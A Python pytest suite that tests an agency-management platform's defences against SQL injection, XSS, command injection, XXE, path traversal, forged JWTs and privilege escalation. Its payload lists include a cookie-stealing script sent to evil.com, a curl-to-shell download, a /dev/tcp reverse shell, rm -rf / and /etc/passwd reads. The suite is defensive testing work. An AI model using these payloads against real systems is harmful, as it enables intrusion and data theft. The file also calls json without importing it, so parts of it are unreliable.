"""
Security testing and vulnerability scanning for AgencyDark platform.
"""
import pytest
import asyncio
import string
import random
import jwt
import base64
from datetime import datetime, timedelta
from uuid import uuid4
from httpx import AsyncClient
from sqlalchemy.ext.asyncio import AsyncSession
import hashlib
import hmac
from typing import List, Dict, Any

from core.security import get_password_hash, verify_password
from core.config import settings


class TestAuthenticationSecurity:
    """Test authentication-related security vulnerabilities."""
    
    @pytest.mark.asyncio
    async def test_sql_injection_login(self, async_client: AsyncClient):
        """Test SQL injection attempts in login."""
        sql_injection_payloads = [
            "admin' OR '1'='1",
            "admin'; DROP TABLE users; --",
            "' OR 1=1 --",
            "admin' /*",
            "admin' UNION SELECT * FROM users --",
            "admin' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055'",
            "'; EXEC xp_cmdshell('net user hack hack /add'); --"
        ]
        
        for payload in sql_injection_payloads:
            response = await async_client.post(
                "/api/v1/auth/login",
                json={
                    "email": payload,
                    "password": "password"
                }
            )
            # Should return 401 or 422, never 500 (which might indicate SQL error)
            assert response.status_code in [401, 422]
            assert "error" not in response.text.lower()
            assert "sql" not in response.text.lower()
    
    @pytest.mark.asyncio
    async def test_password_security_requirements(self, async_client: AsyncClient):
        """Test password security requirements."""
        weak_passwords = [
            "password",          # Too common
            "12345678",         # No letters
            "abcdefgh",         # No numbers
            "Pass123",          # Too short
            "password123",      # No special chars
            "P@ssw0rd",         # Common pattern
            "Admin@123",        # Common pattern
        ]
        
        for weak_password in weak_passwords:
            response = await async_client.post(
                "/api/v1/auth/register",
                json={
                    "email": f"test{uuid4()}@example.com",
                    "password": weak_password,
                    "display_name": "Test User"
                }
            )
            # Should reject weak passwords
            assert response.status_code == 422
            assert "password" in response.json()["detail"].lower()
    
    @pytest.mark.asyncio
    async def test_brute_force_protection(self, async_client: AsyncClient):
        """Test brute force attack protection."""
        email = "bruteforce@example.com"
        
        # Attempt multiple failed logins
        for i in range(10):
            response = await async_client.post(
                "/api/v1/auth/login",
                json={
                    "email": email,
                    "password": f"wrong_password_{i}"
                }
            )
            
            if i < 5:
                assert response.status_code == 401
            else:
                # Should be rate limited or account locked
                assert response.status_code in [429, 423]
                if response.status_code == 429:
                    assert "retry_after" in response.headers
    
    @pytest.mark.asyncio
    async def test_jwt_token_security(self, async_client: AsyncClient):
        """Test JWT token security."""
        # Test invalid tokens
        invalid_tokens = [
            "invalid.token.here",
            "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.invalid",
            "",
            "null",
            "undefined"
        ]
        
        for token in invalid_tokens:
            response = await async_client.get(
                "/api/v1/auth/me",
                headers={"Authorization": f"Bearer {token}"}
            )
            assert response.status_code == 401
        
        # Test algorithm confusion attack
        # Create token with 'none' algorithm
        malicious_token = jwt.encode(
            {"sub": "admin_user_id", "exp": datetime.utcnow() + timedelta(hours=1)},
            "",
            algorithm="none"
        )
        
        response = await async_client.get(
            "/api/v1/auth/me",
            headers={"Authorization": f"Bearer {malicious_token}"}
        )
        assert response.status_code == 401
        
        # Test token with wrong signature
        forged_token = jwt.encode(
            {"sub": "admin_user_id", "exp": datetime.utcnow() + timedelta(hours=1)},
            "wrong_secret_key",
            algorithm="HS256"
        )
        
        response = await async_client.get(
            "/api/v1/auth/me",
            headers={"Authorization": f"Bearer {forged_token}"}
        )
        assert response.status_code == 401
    
    @pytest.mark.asyncio
    async def test_session_fixation(self, async_client: AsyncClient):
        """Test session fixation vulnerability."""
        # Get initial session
        response1 = await async_client.get("/api/v1/auth/csrf-token")
        session_before = response1.cookies.get("session_id")
        
        # Login
        response2 = await async_client.post(
            "/api/v1/auth/login",
            json={
                "email": "test@example.com",
                "password": "TestPassword123!"
            }
        )
        
        if response2.status_code == 200:
            session_after = response2.cookies.get("session_id")
            # Session ID should change after login
            assert session_before != session_after


class TestInputValidation:
    """Test input validation and injection attacks."""
    
    @pytest.mark.asyncio
    async def test_xss_prevention(self, async_client: AsyncClient, auth_headers):
        """Test XSS attack prevention."""
        xss_payloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg onload=alert('XSS')>",
            "javascript:alert('XSS')",
            "<iframe src='javascript:alert(\"XSS\")'></iframe>",
            "<body onload=alert('XSS')>",
            "'\"><script>alert(String.fromCharCode(88,83,83))</script>",
            "<script>document.location='http://evil.com/steal?cookie='+document.cookie</script>",
            "<meta http-equiv=\"refresh\" content=\"0;url=javascript:alert('XSS')\">",
            "<input type=\"text\" value=\"\" onfocus=\"alert('XSS')\" autofocus>"
        ]
        
        for payload in xss_payloads:
            # Test in various endpoints
            # 1. Bulk message
            response = await async_client.post(
                "/api/v1/messaging/bulk",
                headers=auth_headers,
                json={
                    "campaign_name": payload,
                    "message_template": payload,
                    "model_id": str(uuid4()),
                    "recipient_filters": {},
                    "platform": "onlyfans"
                }
            )
            
            if response.status_code == 200:
                data = response.json()
                # Verify script tags are escaped
                assert "<script>" not in str(data)
                assert "alert(" not in str(data)
            
            # 2. Canned response
            response = await async_client.post(
                "/api/v1/messaging/canned-responses",
                headers=auth_headers,
                json={
                    "title": "Test",
                    "content": payload,
                    "category": "test"
                }
            )
            
            if response.status_code == 200:
                data = response.json()
                assert "<script>" not in data.get("content", "")
    
    @pytest.mark.asyncio
    async def test_nosql_injection(self, async_client: AsyncClient, auth_headers):
        """Test NoSQL injection attempts."""
        nosql_payloads = [
            {"$ne": None},
            {"$gt": ""},
            {"$where": "this.password == 'password'"},
            {"$regex": ".*"},
            {"email": {"$ne": "null"}},
            {"$or": [{"email": "admin"}, {"1": "1"}]}
        ]
        
        for payload in nosql_payloads:
            response = await async_client.post(
                "/api/v1/analytics/query",
                headers=auth_headers,
                json={
                    "filters": payload
                }
            )
            # Should handle safely
            assert response.status_code in [200, 400, 422]
            assert "error" not in response.text.lower()
    
    @pytest.mark.asyncio
    async def test_command_injection(self, async_client: AsyncClient, auth_headers):
        """Test command injection attempts."""
        command_payloads = [
            "; ls -la",
            "| cat /etc/passwd",
            "&& rm -rf /",
            "`whoami`",
            "$(curl http://evil.com/shell.sh | sh)",
            "; python -c 'import os; os.system(\"whoami\")'",
            "\n/bin/bash -i >& /dev/tcp/evil.com/4444 0>&1\n"
        ]
        
        for payload in command_payloads:
            # Test in export filename
            response = await async_client.post(
                "/api/v1/reporting/export",
                headers=auth_headers,
                json={
                    "export_type": "revenue",
                    "format": "csv",
                    "filename": f"report{payload}.csv"
                }
            )
            # Should sanitize filename
            if response.status_code == 200:
                assert payload not in response.headers.get("content-disposition", "")
    
    @pytest.mark.asyncio
    async def test_xxe_injection(self, async_client: AsyncClient, auth_headers):
        """Test XML External Entity (XXE) injection."""
        xxe_payload = """<?xml version="1.0" encoding="ISO-8859-1"?>
        <!DOCTYPE foo [
        <!ELEMENT foo ANY >
        <!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
        <foo>&xxe;</foo>"""
        
        response = await async_client.post(
            "/api/v1/data/import",
            headers={**auth_headers, "Content-Type": "application/xml"},
            content=xxe_payload
        )
        
        # Should reject or safely parse XML
        assert response.status_code in [400, 415, 422]
        assert "/etc/passwd" not in response.text
    
    @pytest.mark.asyncio
    async def test_path_traversal(self, async_client: AsyncClient, auth_headers):
        """Test path traversal attacks."""
        path_traversal_payloads = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\config\\sam",
            "....//....//....//etc/passwd",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
            "..%252f..%252f..%252fetc%252fpasswd",
            "..%c0%af..%c0%af..%c0%afetc%c0%afpasswd"
        ]
        
        for payload in path_traversal_payloads:
            # Test in file download
            response = await async_client.get(
                f"/api/v1/files/download",
                headers=auth_headers,
                params={"path": payload}
            )
            # Should not allow access to system files
            assert response.status_code in [400, 403, 404]
            assert "passwd" not in response.text


class TestAPISecurityHeaders:
    """Test security headers and CORS."""
    
    @pytest.mark.asyncio
    async def test_security_headers(self, async_client: AsyncClient):
        """Test presence of security headers."""
        response = await async_client.get("/api/v1/health")
        
        # Check security headers
        assert "X-Content-Type-Options" in response.headers
        assert response.headers["X-Content-Type-Options"] == "nosniff"
        
        assert "X-Frame-Options" in response.headers
        assert response.headers["X-Frame-Options"] in ["DENY", "SAMEORIGIN"]
        
        assert "X-XSS-Protection" in response.headers
        assert response.headers["X-XSS-Protection"] == "1; mode=block"
        
        assert "Strict-Transport-Security" in response.headers
        assert "max-age=" in response.headers["Strict-Transport-Security"]
        
        # No sensitive headers
        assert "Server" not in response.headers
        assert "X-Powered-By" not in response.headers
    
    @pytest.mark.asyncio
    async def test_cors_configuration(self, async_client: AsyncClient):
        """Test CORS configuration."""
        # Test preflight request
        response = await async_client.options(
            "/api/v1/auth/login",
            headers={
                "Origin": "https://evil.com",
                "Access-Control-Request-Method": "POST",
                "Access-Control-Request-Headers": "Content-Type"
            }
        )
        
        # Should not allow arbitrary origins
        if "Access-Control-Allow-Origin" in response.headers:
            assert response.headers["Access-Control-Allow-Origin"] != "*"
            assert response.headers["Access-Control-Allow-Origin"] != "https://evil.com"
        
        # Test with allowed origin
        response = await async_client.options(
            "/api/v1/auth/login",
            headers={
                "Origin": settings.ALLOWED_ORIGINS[0] if settings.ALLOWED_ORIGINS else "https://app.agencydark.com",
                "Access-Control-Request-Method": "POST"
            }
        )
        
        if response.status_code == 200:
            assert "Access-Control-Allow-Methods" in response.headers
            assert "POST" in response.headers["Access-Control-Allow-Methods"]


class TestDataProtection:
    """Test data protection and privacy."""
    
    @pytest.mark.asyncio
    async def test_password_hashing(self):
        """Test password hashing security."""
        password = "SecurePassword123!"
        
        # Hash password
        hashed = get_password_hash(password)
        
        # Verify it's not plaintext
        assert password not in hashed
        
        # Verify it's using bcrypt or similar
        assert hashed.startswith("$2b$") or hashed.startswith("$argon2")
        
        # Verify same password produces different hashes (salted)
        hashed2 = get_password_hash(password)
        assert hashed != hashed2
        
        # Verify both hashes validate
        assert verify_password(password, hashed)
        assert verify_password(password, hashed2)
    
    @pytest.mark.asyncio
    async def test_sensitive_data_exposure(self, async_client: AsyncClient, auth_headers):
        """Test for sensitive data exposure."""
        # Get user profile
        response = await async_client.get(
            "/api/v1/auth/me",
            headers=auth_headers
        )
        
        if response.status_code == 200:
            user_data = response.json()
            
            # Should not expose sensitive fields
            assert "password" not in user_data
            assert "hashed_password" not in user_data
            assert "mfa_secret" not in user_data
            assert "reset_token" not in user_data
            
        # Test error messages don't leak information
        response = await async_client.post(
            "/api/v1/auth/login",
            json={
                "email": "nonexistent@example.com",
                "password": "wrongpassword"
            }
        )
        
        # Should not indicate whether email exists
        assert "user not found" not in response.text.lower()
        assert "email not found" not in response.text.lower()
        assert response.json()["detail"] in ["Invalid credentials", "Authentication failed"]
    
    @pytest.mark.asyncio
    async def test_pii_encryption(self, test_db: AsyncSession):
        """Test PII encryption at rest."""
        # This would check that sensitive fields are encrypted in database
        # Implementation depends on encryption strategy
        pass


class TestAccessControl:
    """Test access control and authorization."""
    
    @pytest.mark.asyncio
    async def test_horizontal_privilege_escalation(
        self,
        async_client: AsyncClient,
        test_db: AsyncSession
    ):
        """Test horizontal privilege escalation."""
        # Create two users in different agencies
        user1_token = await self._create_user_and_login(
            async_client, "user1@example.com", "agency1"
        )
        user2_token = await self._create_user_and_login(
            async_client, "user2@example.com", "agency2"
        )
        
        # User1 tries to access User2's data
        response = await async_client.get(
            "/api/v1/models",  # Models from user2's agency
            headers={"Authorization": f"Bearer {user1_token}"}
        )
        
        if response.status_code == 200:
            models = response.json()
            # Should not see models from other agency
            for model in models.get("items", []):
                assert model["agency_id"] != "agency2_id"
    
    @pytest.mark.asyncio
    async def test_vertical_privilege_escalation(
        self,
        async_client: AsyncClient
    ):
        """Test vertical privilege escalation."""
        # Create regular user
        user_token = await self._create_user_and_login(
            async_client, "regular@example.com", "agency1", role="user"
        )
        
        # Try to access admin endpoints
        admin_endpoints = [
            "/api/v1/admin/users",
            "/api/v1/admin/agencies",
            "/api/v1/admin/settings",
            "/api/v1/financial/payouts/approve"
        ]
        
        for endpoint in admin_endpoints:
            response = await async_client.get(
                endpoint,
                headers={"Authorization": f"Bearer {user_token}"}
            )
            # Should be forbidden
            assert response.status_code in [403, 404]
    
    @pytest.mark.asyncio
    async def test_idor_vulnerability(
        self,
        async_client: AsyncClient,
        auth_headers
    ):
        """Test Insecure Direct Object Reference (IDOR)."""
        # Try to access resources by guessing IDs
        random_ids = [str(uuid4()) for _ in range(10)]
        
        endpoints = [
            "/api/v1/models/{id}",
            "/api/v1/fans/{id}",
            "/api/v1/transactions/{id}",
            "/api/v1/reports/{id}"
        ]
        
        for endpoint_template in endpoints:
            for random_id in random_ids:
                endpoint = endpoint_template.format(id=random_id)
                response = await async_client.get(
                    endpoint,
                    headers=auth_headers
                )
                # Should not expose information about existence
                if response.status_code == 404:
                    error = response.json()
                    assert "not found" in error["detail"].lower()
                    assert random_id not in error["detail"]
    
    async def _create_user_and_login(
        self,
        client: AsyncClient,
        email: str,
        agency: str,
        role: str = "user"
    ) -> str:
        """Helper to create user and get token."""
        # This is a simplified helper - actual implementation would create user properly
        response = await client.post(
            "/api/v1/auth/login",
            json={"email": email, "password": "TestPassword123!"}
        )
        if response.status_code == 200:
            return response.json()["access_token"]
        return ""


class TestWebhookSecurity:
    """Test webhook security."""
    
    @pytest.mark.asyncio
    async def test_webhook_signature_validation(
        self,
        async_client: AsyncClient
    ):
        """Test webhook signature validation."""
        webhook_payload = {
            "event": "transaction.created",
            "data": {"amount": 100}
        }
        
        # Without signature
        response = await async_client.post(
            "/api/v1/webhooks/stripe",
            json=webhook_payload
        )
        assert response.status_code == 400
        
        # With invalid signature
        response = await async_client.post(
            "/api/v1/webhooks/stripe",
            json=webhook_payload,
            headers={"Stripe-Signature": "invalid_signature"}
        )
        assert response.status_code == 400
        
        # With valid signature format but wrong secret
        timestamp = str(int(datetime.utcnow().timestamp()))
        payload_str = json.dumps(webhook_payload)
        wrong_signature = hmac.new(
            b"wrong_secret",
            f"{timestamp}.{payload_str}".encode(),
            hashlib.sha256
        ).hexdigest()
        
        response = await async_client.post(
            "/api/v1/webhooks/stripe",
            json=webhook_payload,
            headers={"Stripe-Signature": f"t={timestamp},v1={wrong_signature}"}
        )
        assert response.status_code == 400
    
    @pytest.mark.asyncio
    async def test_webhook_replay_attack(
        self,
        async_client: AsyncClient
    ):
        """Test webhook replay attack prevention."""
        # Create valid webhook signature (in real test, use actual secret)
        timestamp = str(int((datetime.utcnow() - timedelta(minutes=10)).timestamp()))
        webhook_payload = {
            "event": "payment.succeeded",
            "data": {"transaction_id": str(uuid4())}
        }
        
        # Old timestamp should be rejected
        response = await async_client.post(
            "/api/v1/webhooks/stripe",
            json=webhook_payload,
            headers={
                "Stripe-Signature": f"t={timestamp},v1=signature"
            }
        )
        # Should reject old timestamps
        assert response.status_code in [400, 401]


class TestRateLimiting:
    """Test rate limiting and DDoS protection."""
    
    @pytest.mark.asyncio
    async def test_api_rate_limiting(self, async_client: AsyncClient, auth_headers):
        """Test API rate limiting."""
        endpoint = "/api/v1/analytics/models/test"
        
        # Make rapid requests
        responses = []
        for i in range(150):  # Assuming 100 req/min limit
            response = await async_client.get(
                endpoint,
                headers=auth_headers
            )
            responses.append(response.status_code)
            
            if response.status_code == 429:
                # Check rate limit headers
                assert "X-RateLimit-Limit" in response.headers
                assert "X-RateLimit-Remaining" in response.headers
                assert "X-RateLimit-Reset" in response.headers
                break
        
        # Should hit rate limit
        assert 429 in responses
    
    @pytest.mark.asyncio
    async def test_expensive_operation_limits(
        self,
        async_client: AsyncClient,
        auth_headers
    ):
        """Test limits on expensive operations."""
        # Test large export request
        response = await async_client.post(
            "/api/v1/reporting/export",
            headers=auth_headers,
            json={
                "export_type": "comprehensive",
                "format": "excel",
                "date_from": "2020-01-01",  # 4 years of data
                "date_to": "2024-12-31",
                "include_all_models": True,
                "include_all_transactions": True
            }
        )
        
        # Should limit resource-intensive requests
        if response.status_code == 200:
            # Check if queued or limited
            data = response.json()
            assert data.get("status") in ["queued", "processing"]
        else:
            assert response.status_code in [400, 429]


def generate_security_report(test_results: Dict[str, Any]):
    """Generate security test report."""
    report = {
        "timestamp": datetime.now().isoformat(),
        "summary": {
            "total_tests": 0,
            "passed": 0,
            "failed": 0,
            "vulnerabilities": []
        },
        "details": test_results
    }
    
    # Analyze results
    for category, results in test_results.items():
        for test, result in results.items():
            report["summary"]["total_tests"] += 1
            if result["passed"]:
                report["summary"]["passed"] += 1
            else:
                report["summary"]["failed"] += 1
                report["summary"]["vulnerabilities"].append({
                    "category": category,
                    "test": test,
                    "severity": result.get("severity", "medium")
                })
    
    # Save report
    with open("security_test_report.json", "w") as f:
        json.dump(report, f, indent=2)
    
    # Print summary
    print("\n" + "="*80)
    print("SECURITY TEST SUMMARY")
    print("="*80)
    print(f"Total Tests: {report['summary']['total_tests']}")
    print(f"Passed: {report['summary']['passed']}")
    print(f"Failed: {report['summary']['failed']}")
    
    if report["summary"]["vulnerabilities"]:
        print("\nVulnerabilities Found:")
        for vuln in report["summary"]["vulnerabilities"]:
            print(f"  - [{vuln['severity'].upper()}] {vuln['category']}: {vuln['test']}")
    else:
        print("\nNo vulnerabilities found! ✓")
    
    return report


if __name__ == "__main__":
    pytest.main([__file__, "-v", "--tb=short"])